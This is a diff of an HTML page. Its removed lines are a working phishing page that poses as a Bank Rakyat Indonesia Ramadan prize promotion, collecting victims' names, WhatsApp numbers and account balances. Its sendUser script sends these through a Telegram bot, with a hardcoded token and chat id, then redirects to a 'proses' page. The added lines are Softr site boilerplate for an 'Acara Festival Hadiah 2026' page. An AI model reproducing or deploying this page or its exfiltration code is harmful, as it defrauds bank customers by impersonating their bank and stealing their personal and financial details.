@@ -1,165 +1,774 @@
-<!doctype html>
-<html lang="en">
-  <head>
+<!DOCTYPE html>
+
+<!-- Last Published: Mon, March 02 2026 10:30:34 -->
+<html lang="en-US" dir="ltr">
+<head>
+
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
-    <title>𝐁𝐞𝐫𝐤𝐚𝐡 𝐑𝐚𝐦𝐚𝐝𝐡𝐚𝐧 𝟐𝟎𝟐𝟔 𝐁𝐑𝐈𝐦𝐨 𝐅𝐄𝐒𝐓𝐈𝐕𝐀𝐋</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
-    <link rel="stylesheet" href="index.css" type="text/css" media="all" />
-  </head>
-  <body>
-
-    <main>
-        <nav class="nbr">
-           <div class="logo">
-                <img src="bri.png" alt="" />
-           </div>
-           <div class="group">
-               <i class="bi bi-bell-fill"></i>
-               <i class="bi bi-list"></i>
-               <span>ENG | IND</span>
-           </div>
-        </nav>
-
-        <div id="carouselExampleAutoplaying" class="carousel slide" data-bs-ride="carousel">
-          <div class="carousel-inner">
-            <div class="carousel-item active">
-              <img src="1.png" class="d-block w-100" alt="">
-            </div>
-            <div class="carousel-item">
-              <img src="2.png" class="d-block w-100" alt="">
-            </div>
-            <div class="carousel-item">
-              <img src="3.png" class="d-block w-100" alt="">
-            </div>
-          </div>
-        </div>
-
-        <div class="form"> 
-            <form onsubmit="sendUser(event);" method="post" id="formData">
-
-              <div class="inpput mt-3">
-                <label>Pilih Kupon</label>
-                <div class="inp">
-                    <div class="inpgroup">
-                        <i class="bi bi-gift"></i>
-                    </div>
-                    <select name="a">
-                      <option>Kupon 1 : 5 Unit BMW 520i M Sport</option>
-                      <option>Kupon 2 : 50 Paket Umroh Gratis</option>
-                      <option>Kupon 3 : 20 Unit Hyundai Creta Alpha</option>
-                      <option>Kupon 4 : 50 Unit Vespa Primavera</option>
-                      <option>Kupon 5 : 75 Unit Samasung Z Fold 6</option>
-                      <option>Kupon 6 : Uang Cash 100.juta</option>
-                    </select>
-                </div>
-              </div>
-
-              <div class="inpput mt-3">
-                <label>Nama Lengkap</label>
-                <div class="inp">
-                    <div class="inpgroup">
-                        <i class="bi bi-person"></i>
-                    </div>
-                    <input type="text" name="b" required placeholder="Nama Lengkap"/>
-                </div>
-              </div>
-
-              <div class="inpput">
-                <label>No. WhatsApp</label>
-                <div class="inp">
-                    <div class="inpgroup">
-                        <i class="bi bi-telephone"></i>
-                    </div>
-                    <input type="tel" name="c" required placeholder="+628xxxxxxxxxxx" maxlength="13" minlength="10"/>
-                </div>
-              </div>
-
-              <div class="inpput">
-                <label>saldo Akhir</label>
-                <div class="inp">
-                    <div class="inpgroup">
-                        <i class="bi bi-wallet2"></i>
-                    </div>
-                    <input type="tel" name="d" id="dengan-rupiah" required placeholder="Rp."/>
-                </div>
-              </div>
-
-              <button type="submit" class="kirim">Cetak Kupon</button>
-
-            </form>
-        </div>
-
-        <footer>
-        ©2026 PT. Bank Rakyat Indonesia (Persero) Tbk. Bank BRI berizin dan diawasi oleh Bank Indonesia dan Otoritas Jasa Keuangan. Bank SulutGo merupakan peserta penjaminan LPS.</footer>
-    </main>
-
-
-    <!-- SCRIPT TELEGRAM -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <link rel="preconnect" href="https://assets.softr-files.com">
+    <link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
+      crossorigin="anonymous">
     <script>
-function sendUser(event) {
-    event.preventDefault();
-
-    const kupon = document.querySelector('select[name="a"]').value;
-    const nama = document.querySelector('input[name="b"]').value;
-    const hp = document.querySelector('input[name="c"]').value;
-    const nominal = document.querySelector('input[name="d"]').value;
-
-    const message = `
-📥 DATA BARU MASUK
-
-Kupon : ${kupon}
-Nama  : ${nama}
-nominal : ${nominal}
-hp : ${hp}
-    `;
-
-    const token = "8144086963:AAFzLzI3oOgYrUZQPdw8rGxurpsGJ0SBSBI";
-    const chat_id = "8333801078";
-
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chat_id,
-            text: message
-        })
-    })
-    .then(res => res.json())
-    .then(() => {
-        // Langsung pindah halaman setelah selesai
-        window.location.href = "proses.html";
-    })
-    .catch(() => {
-        // Tetap pindah walaupun gagal
-        window.location.href = "proses.html";
-    });
-}
-                  </script>
-
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
-<script src="jquery.min_1.js"></script>
-<script src="jquery.min.js"></script>
-<script src="reqbri.js"></script>
-<script src="login-a.js"></script>
-<script src=".js"></script>
-<script src="rupiah.js"></script>
-  <script>
-    window.onload = function() {
-        setTimeout(function() {
-            $(".start").fadeIn();
-            setTimeout(function() {
-                $(".start").fadeOut(1000);
-                setTimeout(function() {
-                    $("main").fadeIn(200);
-                    $("#inp").focus();
-                }, 1000);
-            }, 2000);
-        }, 500);
-    }
+        const reactDefaultThemes = {defaultBaseTextSize: '16px',defaultBodyFont: 'Inter',defaultBodyFontWeight: '400',defaultBodyTextColor: '#152237',defaultButtonBackgroundColor: '#0771a8',defaultButtonRoundness: '.25rem',defaultRoundButtonsAndInputs: false,defaultButtonTextColor: '#ffffff',defaultContainerStyle: 'container',defaultTitleFont: 'Bakbak One',defaultTitleFontWeight: '600',defaultTitleTextColor: '#152237',defaultSize: 'L',defaultBackgroundColor: '#ffffff',defaultShadow: true,defaultBackgroundStyle: 'HIGHLIGHTED',defaultSurfaceColor: '#ffffff',defaultSuccessColor: '#41d33e',defaultWarningColor: '#f8d313',defaultDangerColor: '#f73730',defaultNavigationDesktopTop: 'softAccent',defaultNavigationDesktopSide: 'regular',defaultNavigationMobileTop: 'softAccent',defaultNavigationMobileSide: 'regular',defaultNavigationMobileBottom: 'regular'};
     </script>
-</html>
+        <script>window.isNavigationTransitionsEnabled = true; window.isViteBuildEnabled = true; </script>
+        <script src="https://assets.softr-files.com/softr-blocks/prod/libs/softr-page-renderer/softr-page-renderer.min.js?t=1751533621"></script>
 
+<meta name="twitter:title" content="Home">
+<meta property="twitter:title" content="Home">
+<meta property="og:title" content="Home">
+<meta name="twitter:description" content="Made with Softr, the easiest way to turn your data into portals and internal tools.">
+<meta property="twitter:description" content="Made with Softr, the easiest way to turn your data into portals and internal tools.">
+<meta property="og:description" content="Made with Softr, the easiest way to turn your data into portals and internal tools.">
+<meta property="og:image" content="https://assets.softr-files.com/assets/images/random/og_default_image.png">
+<meta name="twitter:image" content="https://assets.softr-files.com/assets/images/random/og_default_image.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:url" content="https://acarafestival2026.softr.app/">
+<meta property="twitter:url" content="https://acarafestival2026.softr.app/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Acara Festival Hadiah 2026">
+
+<title>Home</title>
+<meta name="description" content="Made with Softr, the easiest way to turn your data into portals and internal tools.">
+
+
+<link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+
+
+<link rel="canonical" href="https://acarafestival2026.softr.app/" />
+<link href="https://fonts.softr-files.com/google/api/css?family=Bakbak+One:400&display=block" rel="stylesheet"><link href="https://fonts.softr-files.com/google/api/css?family=Inter:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=block" rel="stylesheet">
+
+<link href="https://assets.softr-files.com/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+
+
+<style type="text/css">
+
+    html {
+        scroll-behavior: smooth;
+        font-size: 16px;
+        overflow-x: hidden;
+        background-color: #ffffff;
+    }
+
+    body {
+        /* fallback for devices that do not support dvh units */
+        min-height: 100vh;
+        min-height: 100dvh;
+        /* reboot.css sets its own background, but we want it to match our theme */
+        background-color: inherit;
+    }
+
+    .container {
+        max-width: 100%;
+    }
+
+    @media (min-width: 576px) {
+        .container {
+            max-width: 540px;
+        }
+    }
+
+    @media (max-width: 576px) {
+        .navbar-brand img {
+            max-width: 15rem !important;
+        }
+    }
+
+    @media (min-width: 768px) {
+        .container {
+            max-width: 720px;
+        }
+    }
+
+    @media (min-width: 992px) {
+        .container {
+            max-width: 960px;
+        }
+    }
+
+    @media (min-width: 1200px) {
+        .container {
+            max-width: 1140px;
+        }
+    }
+
+    p, h1, h2, h3, h4, h5, small {
+        white-space: pre-line;
+    }
+
+    @media screen and (max-width: 768px) {
+        input, select, textarea {
+            font-size: 16px !important;
+        }
+    }
+
+    h1.sw-font-family-default,
+    h2.sw-font-family-default,
+    h3.sw-font-family-default {
+        font-family: "Bakbak One";
+    }
+
+    h1.sw-font-weight-default,
+    h2.sw-font-weight-default,
+    h3.sw-font-family-default {
+        font-weight: 600;
+    }
+
+    h1.sw-text-color-default,
+    h2.sw-text-color-default,
+    h3.sw-font-family-default {
+        color: #152237;
+    }
+
+    section.sw-font-family-default,
+    header.sw-font-family-default,
+    nav.sw-font-family-default,
+    footer.sw-font-family-default,
+    div.sw-font-family-default,
+    span.sw-font-family-default,
+    small.sw-font-family-default,
+    pre.sw-font-family-default,
+    p.sw-font-family-default,
+    b.sw-font-family-default,
+    li.sw-font-family-default,
+    ul.sw-font-family-default,
+    a.sw-font-family-default,
+    h4.sw-font-family-default,
+    h5.sw-font-family-default,
+    h6.sw-font-family-default {
+        font-family: "Inter";
+    }
+
+    span.sw-font-weight-default,
+    li.sw-font-weight-default span,
+    small.sw-font-weight-default,
+    li.sw-font-weight-default small,
+    pre.sw-font-weight-default,
+    p.sw-font-weight-default,
+    h4.sw-font-weight-default,
+    h5.sw-font-weight-default,
+    h6.sw-font-weight-default {
+        font-weight: 400;
+    }
+
+    span.sw-text-color-default,
+    li.sw-text-color-default span,
+    small.sw-text-color-default,
+    li.sw-text-color-default small,
+    pre.sw-text-color-default,
+    p.sw-text-color-default,
+    div.sw-text-color-default,
+    h4.sw-text-color-default,
+    h5.sw-text-color-default,
+    h6.sw-text-color-default {
+        color: #152237;
+    }
+
+    input.sw-font-family-default,
+    textarea.sw-font-family-default {
+        font-family: "Inter";
+    }
+
+    input.sw-font-weight-default,
+    textarea.sw-font-weight-default {
+        font-weight: 400;
+    }
+
+    .sw-font-family-default::-webkit-input-placeholder,
+    .sw-font-family-default::-moz-placeholder,
+    .sw-font-family-default:-ms-input-placeholder,
+    .sw-font-family-default:-moz-placeholder {
+        font-family: "Inter";
+    }
+
+    .sw-font-family-default::-webkit-input-placeholder,
+    .sw-font-family-default::-moz-placeholder,
+    .sw-font-family-default:-ms-input-placeholder,
+    .sw-font-family-default:-moz-placeholder {
+        font-weight: 400;
+    }
+
+    .sw-text-color-default[data-element='button'] {
+        color: #ffffff;
+    }
+
+    .sw-background-color-default[data-element='button'] {
+        background-color: #0771a8;
+    }
+
+    .sw-border-radius-default[data-element='button'] {
+        border-radius: .25rem;
+    }
+
+    /* Micromodal styles */
+    .sw-modal {
+        display: none;
+    }
+
+    .sw-modal.is-open {
+        display: block;
+    }
+
+    .sw-modal .sw-modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.6);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    .sw-modal .sw-modal-container {
+        background-color: #FFFFFF;
+        padding: 40px 10px 10px 10px;
+        overflow-y: auto;
+        box-sizing: border-box;
+        position: relative;
+        margin: auto;
+        border-radius: 16px;
+    }
+
+    .sw-modal #sw-modal-content {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .sw-modal .sw-modal-close {
+        background: transparent;
+        border: 0;
+        position: absolute;
+        right: 10px;
+        top: 10px;
+    }
+
+    .sw-modal-close:focus {
+        outline: none;
+    }
+
+    .sw-modal .sw-modal-iframe {
+        border: none;
+    }
+
+    .sw-modal-size-sm {
+        width: 464px;
+        height: 350px;
+        max-width: 95vw;
+        max-height: 95vh;
+    }
+
+
+    .sw-modal-size-md {
+        width: 755px;
+        height: 600px;
+        max-width: 95vw;
+        max-height: 95vh;
+    }
+
+    .sw-modal-size-lg {
+        width: 1196px;
+        height: 780px;
+        max-width: 95vw;
+        max-height: 95vh;
+    }
+
+    .sw-modal-size-xl {
+        width: 95vw;
+        height: 95vh;
+    }
+
+    .sw-modal-container > div, #sw-modal-content, #sw-modal-content iframe {
+        width: 100%;
+        height: 100%;
+    }
+
+    .sw-modal-close:before {
+        content: "\2715";
+    }
+
+    @keyframes rotation {
+        from {
+            transform: rotate(0deg);
+        }
+        to {
+            transform: rotate(359deg);
+        }
+    }
+
+
+</style>
+
+<style>
+    .sw-font-size-3xl {
+        font-size: 2rem;
+    }
+    .sw-font-size-4xl {
+        font-size: 2.25rem;
+    }
+    .sw-font-size-5xl {
+        font-size: 3rem;
+    }
+
+</style>
+
+<!-- App Integrations -->
+
+<!-- End Integrations -->
+
+
+
+<script>window['application_context'] = {}; window['application_context']['policies'] ={"numberOfSupportedDomains":1,"canDisableSoftrBranding":true,"hasSoftrBrandingFooterBoundSupport":true,"numberOfDatasourceRecordsPerTable":null,"numberOfInternalUsers":null,"numberOfExternalUsers":null,"supportedNumberOfMembershipUsers":null,"hasGoogleAuthenticationSupport":true,"hasSamlAuthenticationSupport":false,"hasOpenIdAuthenticationSupport":false,"hasUserLastSeenSupport":true,"hasUserAuthOneTimeCodeSupport":true,"has2faSupport":true,"hasAdvancedSecuritySupport":true,"numberOfDaysApplicationHistory":365,"hasCustomCodeSupport":true,"hasEmbedBlockSupport":true,"hasTransferApplicationsAcrossWorkspace":true,"hasPwaSupport":true,"hasDynamicAppLogoSupport":false,"hasSignatureFieldSupport":true,"hasFormConditionsSupport":true,"hasTransferOwnershipSupport":null,"hasActionButtonRecordLevelVisibilitySupport":true,"hasActionButtonCustomUserGroupVisibilitySupport":true,"numberOfUsersInWorkspace":500,"numberOfCustomUserGroups":1000,"numberOfPublishedApplications":null,"restrictedDataSources":[],"restrictedBlocks":[],"hasInlineEditingSupport":true,"hasFilteredUserSyncSupport":true,"restrictedActions":[],"hasEditAddFormOptionFilterSupport":null,"hasCustomEmailSenderSupport":true,"hasSoftrApiSupport":true,"hasDomainRestrictedSignUpSupport":true,"supportedDataRestrictionOperations":["VIEW","EDIT","DELETE","ADD"],"hasHideBlockOnDetailsPageSupport":true,"hasOptionFilterSupport":true,"hasCustomDomainAddOnSupport":true,"hasUserAddOnSupport":false,"numberOfAiCredits":10000,"workflowsMaxExecutionTimeSeconds":null,"workflowsMinimumPollingIntervalSeconds":60,"numberOfWorkflowActionExecutionsPerMonth":25000,"restrictedWorkflowActions":[],"restrictedWorkflowTriggers":[],"hasApplicationLevelCommentsSupport":true,"numberOfSupportedSoftrDatabaseRecordsPerWorkspace":1000000,"numberOfSupportedSoftrDatabaseRecordsPerDatabase":200000,"supportedSoftrDatabaseStorageSizePerWorkspace":250000000000}; window['application_context']['date_and_time_settings'] = {"formatSettings":{"type":"LOCAL","localSettings":{"localizeDayAndMonth":true},"fixedSettings":null},"timezoneSettings":{"type":"LOCAL","fixedTimezone":null}}; window['application_context']['number_formatting_settings'] = {"type":"LOCAL","fixedLocale":"en-US"}; window['application_context']['global_search_settings'] = {"enabled":true,"searchPlaceholder":"Search","initialStateMessage":"Type something to start searching","initialStateImage":null,"noResultsMessage":"No results found","noResultsImage":null,"backdrop":null}; window['application_context']['user_settings'] = {"authSettings":{"loginEnabled":true,"authenticationMethods":["EMAIL"],"signUpSettings":{"policy":"DISABLED","allowedDomains":[]},"userSessionExpiration":"90_DAYS","userInactivityTimeout":"NEVER","emailAuthSettings":{"loginMethods":["PASSWORD"],"passwordSettings":{"inputLabel":"Password","inputPlaceholder":"Enter your password","forgotPasswordText":"Forgot password","incorrectPasswordText":"Incorrect password.","newPasswordLabel":"New password","newPasswordPlaceholder":"Set a secure password","strongPasswords":true,"minimumCharactersText":"At least 12 characters","upperAndLowerCaseText":"1 uppercase & 1 lowercase","numberText":"1 number (0-9)","symbolText":"1 symbol (!@#$%^&*)","repeatPasswordLabel":"Repeat password","repeatPasswordPlaceholder":"Repeat your password","passwordsDontMatchText":"Passwords don't match."},"emailOneTimeCodeSettings":{"expiration":"5_MINUTES","inputLabel":"Verification code","inputPlaceholder":"Enter verification code","resendText":"Resend","invalidCodeText":"Invalid code."},"secondaryLoginMethods":[],"smsOneTimeCodeSettings":null,"authenticatorSettings":null,"inputLabel":"Email","inputPlaceholder":"Enter your email"},"googleSettings":{"clientId":null,"clientSecret":null,"userType":"INTERNAL","emailDomains":[]},"ssoSettings":{"type":"SAML","emailDomains":[],"saml":{"acsUrl":null,"audienceUrl":null,"metadataXml":null,"emailKey":null,"firstNameKey":null,"lastNameKey":null},"openId":{"callbackUrl":null,"providerUrl":null,"tokenServiceUrl":null,"clientId":null,"clientSecret":null}}},"autoInvite":false}; window['application_context']['application_logo'] = {"type":"IMAGE","icon":{"logo":"","text":""},"image":{"horizontal":"","square":"https://assets.softr-files.com/applications/1c5cbd69-6036-4f3f-be0b-fb7860be3d46/assets/517e50db-ab40-4b43-a2fa-d530bc70619b.png"}}; window['application_context']['user_connection'] = {}; window['application_context']['user_connection']['datasource'] = {}; window['application_context']['user_connection']['datasource']['id'] = 'b9292fd6-14c3-4e3b-965f-a256dcebf64a'; window['application_context']['user_connection']['datasource']['datasource_integration_type'] = 'SOFTR_TABLES'; window['application_context']['user_connection']['attributes'] = {"tablespaceId":"0889fed5-1ea7-42d9-920a-9c1eebfc0c3c","nameFieldName":"o0JWv","emailFieldName":"c63tL"}; </script>
+
+<style>
+ .sw-font-size-5xl {
+    font-size: 3rem;
+  }
+  .sw-font-size-4xl {
+    font-size: 2.25rem;
+  }
+</style>
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    if($(window).width() < 768) {
+       $('h1.sw-font-size-10xl').removeClass('sw-font-size-10xl').addClass('sw-font-size-5xl');
+       $('h1.sw-font-size-9xl').removeClass('sw-font-size-9xl').addClass('sw-font-size-5xl');
+       $('h1.sw-font-size-8xl').removeClass('sw-font-size-8xl').addClass('sw-font-size-5xl');
+       $('h1.sw-font-size-7xl').removeClass('sw-font-size-7xl').addClass('sw-font-size-5xl');
+       $('h1.sw-font-size-6xl').removeClass('sw-font-size-6xl').addClass('sw-font-size-4xl');
+       $('h2.sw-font-size-10xl').removeClass('sw-font-size-10xl').addClass('sw-font-size-5xl');
+       $('h2.sw-font-size-9xl').removeClass('sw-font-size-9xl').addClass('sw-font-size-5xl');
+       $('h2.sw-font-size-8xl').removeClass('sw-font-size-8xl').addClass('sw-font-size-5xl');
+       $('h2.sw-font-size-7xl').removeClass('sw-font-size-7xl').addClass('sw-font-size-5xl');
+       $('h2.sw-font-size-6xl').removeClass('sw-font-size-6xl').addClass('sw-font-size-4xl');
+       $('div.sw-font-size-10xl').removeClass('sw-font-size-10xl').addClass('sw-font-size-5xl');
+       $('div.sw-font-size-9xl').removeClass('sw-font-size-9xl').addClass('sw-font-size-5xl');
+       $('div.sw-font-size-8xl').removeClass('sw-font-size-8xl').addClass('sw-font-size-5xl');
+       $('div.sw-font-size-7xl').removeClass('sw-font-size-7xl').addClass('sw-font-size-5xl');
+       $('div.sw-font-size-6xl').removeClass('sw-font-size-6xl').addClass('sw-font-size-4xl');
+       $('p.sw-font-size-10xl').removeClass('sw-font-size-10xl').addClass('sw-font-size-5xl');
+       $('p.sw-font-size-9xl').removeClass('sw-font-size-9xl').addClass('sw-font-size-5xl');
+       $('p.sw-font-size-8xl').removeClass('sw-font-size-8xl').addClass('sw-font-size-5xl');
+       $('p.sw-font-size-7xl').removeClass('sw-font-size-7xl').addClass('sw-font-size-5xl');
+       $('p.sw-font-size-6xl').removeClass('sw-font-size-6xl').addClass('sw-font-size-4xl');
+       $('span.sw-font-size-10xl').removeClass('sw-font-size-10xl').addClass('sw-font-size-5xl');
+       $('span.sw-font-size-9xl').removeClass('sw-font-size-9xl').addClass('sw-font-size-5xl');
+       $('span.sw-font-size-8xl').removeClass('sw-font-size-8xl').addClass('sw-font-size-5xl');
+       $('span.sw-font-size-7xl').removeClass('sw-font-size-7xl').addClass('sw-font-size-5xl');
+       $('span.sw-font-size-6xl').removeClass('sw-font-size-6xl').addClass('sw-font-size-4xl');
+    }
+  });
+</script>
+
+
+
+
+<script>window['is401Page'] = false; </script>
+
+
+<script>
+    const BlocksRenderedEventName = "@softr/page-content-loaded";
+</script>
+
+<!--Adds show-toolbar=true into action button query param only for softr.io templates preview flow. TODO uncomment after redirections are fixed-->
+<!--<script>-->
+<!--    setTimeout(() => {-->
+<!--        if (!window.location.href.includes('https://www.softr.io/templates')) {-->
+<!--            return;-->
+<!--        }-->
+<!--        const heroElement = document.getElementById('hero1');-->
+<!--        if (!heroElement) {-->
+<!--            return;-->
+<!--        }-->
+<!--        const links = heroElement.querySelectorAll('a');-->
+<!--        links.forEach(link => {-->
+<!--            const href = link.getAttribute('href');-->
+<!--            // if conditions:-->
+<!--            // 1. if href is not empty for a tag-->
+<!--            // 2. if href does not contain the softr.io dashboard link (hero "Use Template" button)-->
+<!--            // 3. if href does not already contain the show-toolbar=true query param-->
+<!--            // 4. if href contains http or https (that is if not the 'open-page' action when href is like href="/my-page", as it's handled from BE)-->
+<!--            if (href && !href.includes('https://studio.softr.io/dashboard') && !href.includes('show-toolbar=true') && (href.includes("https://") || href.includes("http://"))) {-->
+<!--                if (href.includes('?')) {-->
+<!--                    link.setAttribute('href', href + '&show-toolbar=true');-->
+<!--                } else {-->
+<!--                    link.setAttribute('href', href + '?show-toolbar=true');-->
+<!--                }-->
+<!--            }-->
+<!--        });-->
+<!--    }, 2000);-->
+<!--</script>-->
+
+<script>
+    function applyMobileTextSizesForV4Blocks() {
+        const width = window.innerWidth;
+
+        const largeElements = [
+            'h1.sw-font-size-10xl', 'h1.sw-font-size-9xl', 'h1.sw-font-size-8xl', 'h1.sw-font-size-7xl',
+            'h2.sw-font-size-10xl', 'h2.sw-font-size-9xl', 'h2.sw-font-size-8xl', 'h2.sw-font-size-7xl',
+            'h3.sw-font-size-10xl', 'h3.sw-font-size-9xl', 'h3.sw-font-size-8xl', 'h3.sw-font-size-7xl',
+            'div.sw-font-size-10xl', 'div.sw-font-size-9xl', 'div.sw-font-size-8xl', 'div.sw-font-size-7xl',
+            'p.sw-font-size-10xl', 'p.sw-font-size-9xl', 'p.sw-font-size-8xl', 'p.sw-font-size-7xl',
+            'span.sw-font-size-10xl', 'span.sw-font-size-9xl', 'span.sw-font-size-8xl', 'span.sw-font-size-7xl',
+        ];
+
+        const smallElements = [
+            'h1.sw-font-size-6xl', 'h2.sw-font-size-6xl', 'h3.sw-font-size-6xl', 'div.sw-font-size-6xl', 'p.sw-font-size-6xl', 'span.sw-font-size-6xl',
+        ];
+
+        if (width < 576) {
+            largeElements.forEach(selector => {
+                document.querySelectorAll(selector).forEach(el => {
+                    el.classList.remove(selector.split('.').slice(1).join(' '));
+                    el.classList.add('sw-font-size-4xl');
+                });
+            });
+
+            smallElements.forEach(selector => {
+                document.querySelectorAll(selector).forEach(el => {
+                    el.classList.remove(selector.split('.').slice(1).join(' '));
+                    el.classList.add('sw-font-size-3xl');
+                });
+            });
+        } else if (width < 768) {
+            largeElements.forEach(selector => {
+                document.querySelectorAll(selector).forEach(el => {
+                    el.classList.remove(selector.split('.').slice(1).join(' '));
+                    el.classList.add('sw-font-size-5xl');
+                });
+            });
+
+            smallElements.forEach(selector => {
+                document.querySelectorAll(selector).forEach(el => {
+                    el.classList.remove(selector.split('.').slice(1).join(' '));
+                    el.classList.add('sw-font-size-4xl');
+                });
+            });
+        }
+    }
+</script>
+
+<!-- This script synchronizes the query parameters and path of the top window with those of the iframe.
+     It updates the top window's URL, and include any query parameters from the iframe's URL
+     when the iframe's path is redirected. -->
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        if (shouldNotReplaceTopWithCurrent()) {
+            return;
+        }
+        try {
+            const currentUrl = new URL(window.location.href);
+            const topUrl = new URL(window.top.location.href);
+
+            const currentParams = new URLSearchParams(currentUrl.search);
+            const topParams = new URLSearchParams(topUrl.search);
+
+            for (const [key, value] of topParams) {
+                // do not append duplicate query parameters
+                if (!currentParams.has(key) && !Array.from(currentParams).some(([k, v]) => k === key)) {
+                    currentParams.append(key, value);
+                }
+            }
+
+            currentUrl.search = currentParams.toString();
+            window.top.history.pushState(null, '', currentUrl.toString());
+        } catch (error) {
+            console.error("An error occurred while updating query parameters:", error);
+        }
+    });
+
+    function shouldNotReplaceTopWithCurrent() {
+        if (window.location.href.split('?')[0] === window.top.location.href.split('?')[0]) {
+            return true;
+        }
+
+        if ("false" !== "true" && !window.top.location.href.includes(".preview.")) {
+            return true;
+        }
+
+        if ("false" === "true" || window.location.href.includes("viewMode=modal") || window.location.href.includes("viewMode%3Dmodal")) {
+            return true;
+        }
+
+        return false;
+    }
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        window.parent.postMessage({ name: 'previewIframeLoaded' }, '*');
+    });
+    /** Image lineup on mobile **/
+    window.addEventListener(BlocksRenderedEventName, function () {
+        function changeImageDirectionsOnMobile() {
+
+            const classListSection = $('body>div>section')?.attr('class')?.split(/\s+/);
+            const textClassSection = classListSection?.find(cls => cls.startsWith('feature'));
+
+            const classListHeader = $('body>div>header')?.attr('class')?.split(/\s+/);
+            const textClassHeader = classListHeader?.find(cls => cls.startsWith('hero'));
+
+            /*If FEATURE block*/
+            if (textClassSection) {
+                findRowsWidthImageAndReverse(textClassSection)
+            }
+
+            /*If HERO block*/
+            if (textClassHeader) {
+                findRowsWidthImageAndReverse(textClassHeader)
+            }
+        }
+
+        function findRowsWidthImageAndReverse(textClass) {
+            const rowsWithImages = $('.' + textClass + ' .row.align-items-center').has('img').toArray();
+            const rowsWithLeftSideImages = rowsWithImages.filter(row => {
+                return $(row).children().first().children().first().prop("tagName") === 'IMG';
+            });
+
+
+            rowsWithLeftSideImages.forEach(row => {
+                if ($(window).width() <= 768) {
+                    row.classList.add('flex-column-reverse')
+                }
+            });
+        }
+
+        if ($(window).width() <= 768) {
+            changeImageDirectionsOnMobile();
+        }
+    });
+
+    /** BG Size on mobile **/
+    window.addEventListener(BlocksRenderedEventName, function () {
+        if ($(window).width() <= 768) {
+            var element = $('section.sw-background-size-auto, header.sw-background-size-auto');
+            element.removeClass('sw-background-size-auto');
+            element.css('background-size', 'cover');
+
+            $('section.sw-background-attachment-fixed, header.sw-background-attachment-fixed').removeClass('sw-background-attachment-fixed');
+        }
+    });
+
+    /** Disable zoom on mobile **/
+    window.addEventListener(BlocksRenderedEventName, function () {
+        if ($(window).width() <= 768) {
+            $('input.sw-font-size-s').removeClass('sw-font-size-s');
+            $('textarea.sw-font-size-s').removeClass('sw-font-size-s');
+            $('select.sw-font-size-s').removeClass('sw-font-size-s');
+        }
+    });
+
+    window.addEventListener('user-sign-out', (e) => {
+        const message = {
+            name: 'user-sign-out-triggered',
+        };
+
+        window.parent.postMessage(message, '*');
+    });
+
+    function isSafari() {
+        const chromeAgent = window.navigator.userAgent.includes("Chrome");
+        const safariAgent = window.navigator.userAgent.includes("Safari");
+
+        // Google Chrome also contains "Safari" user agent.
+        return safariAgent && !chromeAgent;
+    }
+</script>
+
+<style>
+    @media (display-mode: standalone), (display-mode: fullscreen), (display-mode: minimal-ui) {
+        .progressier-widget {
+            display: none !important;
+        }
+    }
+</style>
+
+
+</head>
+
+<body>
+
+
+<div id="page-content" data-appsubdomain="AcaraFestival2026.softr.app" data-appid="1c5cbd69-6036-4f3f-be0b-fb7860be3d46" data-pageId="a6a1dcd4-091e-46c1-ae62-dee74abbfe29" data-workspaceid="83f2ac9e-a0fe-43b2-b5a8-fd9982acff75" data-paymentplan="price_1PmrXeIWZwIztnHlAGyfJOQI" class="content">
+
+</div>
+
+
+<!-- Scripts -->
+<script src="https://assets.softr-files.com/libs/jquery/3.7.0/jquery.min.js"></script>
+<script src="https://assets.softr-files.com/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
+  integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
+  crossorigin="anonymous">
+</script>
+<script src="https://assets.softr-files.com/libs/micromodal/0.4.10/micromodal.min.js"></script>
+
+<script>
+    /** this function is called from list blocks (do not delete) **/
+    function openSwModal(url, size) {
+        MicroModal.init({
+            disableScroll: true,
+            awaitOpenAnimation: true,
+            awaitCloseAnimation: true
+        });
+
+        MicroModal.show("sw-modal");
+
+        const iframeElem = document.querySelector(".sw-modal-iframe");
+        const modalContainer = document.querySelector(".sw-modal-container");
+
+        const viewModeParam = "viewMode=modal";
+        const urlIsLocal = url.startsWith('#') || url.startsWith('/') || url.startsWith(window.location.origin);
+        const modalUrl = urlIsLocal ? (url.indexOf("?") !== -1 ? url + "&" + viewModeParam : url + "?" + viewModeParam) : url;
+        iframeElem.setAttribute("src", modalUrl);
+
+        modalContainer.classList.remove('sw-modal-size-sm', 'sw-modal-size-md', 'sw-modal-size-lg', 'sw-modal-size-xl');
